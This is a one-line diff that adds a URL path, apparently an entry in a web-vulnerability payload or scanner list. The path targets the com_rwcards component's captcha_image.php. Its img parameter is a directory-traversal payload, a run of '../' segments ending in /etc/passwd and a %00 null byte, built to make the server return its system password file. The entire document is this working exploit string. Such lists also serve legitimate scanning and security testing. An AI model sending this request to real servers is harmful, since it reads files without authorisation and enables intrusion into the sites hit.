@@ -1,0 +1,1 @@
+/components/com_rwcards/captcha/captcha_image.php?img=../../../../../../../../../etc/passwd%00
